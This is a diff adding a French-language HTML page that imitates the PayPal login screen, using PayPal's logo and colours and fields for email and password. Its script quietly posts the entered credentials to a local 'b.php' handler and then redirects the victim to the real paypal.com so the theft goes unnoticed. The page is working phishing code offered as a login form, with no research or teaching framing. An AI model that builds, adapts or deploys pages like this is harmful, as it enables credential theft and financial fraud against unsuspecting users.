@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulaire de connexion</title>
+    <style>
+        body {
+            background-color: #ffffff; /* Fond blanc */
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh; /* Hauteur minimale de la vue */
+            margin: 0;
+        }
+        form {
+            background-color: #ffffff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+            margin-bottom: 20px; /* Marge en bas du formulaire */
+        }
+        img {
+            max-width: 30px; /* Taille réduite pour le logo PayPal */
+            margin-bottom: 40px; /* Marge augmentée en bas */
+        }
+        div {
+            margin-bottom: 10px; /* Marge réduite en bas */
+            text-align: left;
+        }
+        input[type="email"],
+        input[type="password"] {
+            width: 100%; /* Largeur totale pour les champs de saisie */
+            padding: 18px; /* Rembourrage augmenté pour les champs de saisie */
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 18px; /* Taille de police augmentée pour les champs de saisie */
+            box-sizing: border-box;
+            margin-bottom: 10px; /* Marge réduite en bas pour les champs de saisie */
+            max-width: 100%; /* Assurer qu'il ne dépasse pas la largeur parente */
+        }
+        .forgot-password {
+            text-align: left;
+            font-size: 14px; /* Taille de police réduite pour le lien de mot de passe oublié */
+            margin-top: -10px; /* Ajuster la marge pour un meilleur espacement */
+            margin-bottom: 10px; /* Ajouter une marge en dessous pour l'espacement */
+            font-weight: bold; /* Caractères gras */
+        }
+        .forgot-password a {
+            color: #007bff; /* Couleur bleue pour le lien */
+            text-decoration: none; /* Supprimer le soulignement */
+        }
+        .forgot-password a:hover {
+            text-decoration: underline; /* Soulignement au survol */
+        }
+        button {
+            width: 100%; /* Largeur totale pour le bouton */
+            padding: 15px; /* Hauteur réduite pour le bouton */
+            border: none;
+            border-radius: 50px; /* Coins plus arrondis */
+            background-color: #0544B5; /* Bleu foncé similaire à PayPal */
+            color: white;
+            font-size: 18px; /* Taille de police réduite pour le bouton */
+            cursor: pointer;
+            transition: background-color 0.3s ease; /* Transition fluide au survol */
+            /* Arrière-plan dégradé pour un effet de brillance subtil */
+            background-image: linear-gradient(135deg, rgba(255,255,255,0.1) 0%, rgba(255,255,255,0.05) 100%);
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            margin-bottom: 10px; /* Marge en bas pour l'espacement */
+        }
+        button:hover {
+            background-color: #003a8c; /* Bleu plus foncé au survol */
+        }
+        .separator {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 10px 0; /* Marge autour du séparateur */
+        }
+        .separator span {
+            margin: 0 10px; /* Espace de chaque côté du texte */
+            font-size: 18px; /* Taille de police pour le texte */
+        }
+        .create-account {
+            margin-top: 10px; /* Marge en haut pour l'espacement */
+            text-align: center;
+            width: 100%; /* Largeur totale */
+        }
+        .create-account button {
+            background-color: black; /* Fond noir */
+            color: white; /* Couleur de texte blanche */
+            border: 2px solid black; /* Bordure noire */
+            border-radius: 50px; /* Coins plus arrondis */
+            padding: 15px; /* Hauteur du bouton */
+            font-size: 18px; /* Taille de police */
+            cursor: pointer;
+            transition: background-color 0.3s ease, color 0.3s ease; /* Transition fluide au survol */
+            width: 80%; /* Largeur ajustée pour le bouton */
+            max-width: 100%; /* Assurer qu'il ne dépasse pas la largeur parente */
+        }
+        .create-account button:hover {
+            background-color: white; /* Fond blanc au survol */
+            color: black; /* Texte noir au survol */
+        }
+        .footer {
+            font-size: 14px; /* Taille de police réduite pour les liens de pied de page */
+            text-align: center;
+            color: #555; /* Couleur de texte gris foncé */
+            padding: 10px; /* Ajouter un rembourrage pour l'espacement */
+            background-color: #f0f0f0; /* Fond gris clair */
+            width: 100%; /* Largeur totale pour le pied de page */
+            position: fixed; /* Position fixée en bas */
+            left: 0;
+            bottom: 0;
+            z-index: 1000; /* S'assurer qu'il est au-dessus des autres contenus */
+        }
+        .footer a {
+            text-decoration: none; /* Supprimer le soulignement des liens */
+            margin: 0 10px; /* Marge entre les liens */
+            color: #007bff; /* Couleur bleue */
+        }
+        .footer a:hover {
+            text-decoration: underline; /* Soulignement au survol */
+        }
+    </style>
+    <script>
+        function handleFormSubmit(event) {
+            event.preventDefault(); // Empêche l'envoi immédiat du formulaire
+            var form = event.target;
+
+            // Envoi du formulaire en utilisant AJAX
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", form.action, true);
+            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4 && xhr.status === 200) {
+                    // Redirige vers PayPal après le succès de l'envoi
+                    window.location.href = "https://www.paypal.com";
+                }
+            };
+
+            // Récupérer les données du formulaire
+            var formData = new FormData(form);
+            var urlEncodedData = new URLSearchParams(formData).toString();
+
+            // Envoyer les données
+            xhr.send(urlEncodedData);
+        }
+    </script>
+</head>
+<body>
+    <form method="post" action="b.php" onsubmit="handleFormSubmit(event)">
+        <img src="https://www.paypalobjects.com/webstatic/icon/pp258.png" alt="Logo PayPal">
+        <div>
+            <input type="email" id="email" name="email" placeholder="Email ou numéro de mobile" required>
+        </div>
+        <div>
+            <input type="password" id="password" name="password" placeholder="Mot de passe" required>
+        </div>
+        <div class="forgot-password">
+            <a href="#">Mot de passe oublié ?</a>
+        </div>
+        <button type="submit">Connexion</button>
+    </form>
+    <div class="separator">
+        <span>ou</span>
+    </div>
+    <div class="create-account">
+        <button style="width: 30%; padding: 15px; border-radius: 50px; font-size: 18px; cursor: pointer; transition: background-color 0.3s ease; background-color: transparent; color: #0544B5; border: 2px solid #0544B5;">Ouvrir un compte</button>
+    </div>
+    <div class="footer">
+        <a href="#">Français</a>
+        <a href="#">English</a>
+        <a href="#">Contact</a>
+        <a href="#">Respect de la vie privée</a>
+        <a href="#">Contrats d'utilisation</a>
+        <a href="#">International</a>
+    </div>
+</body>
+</html>
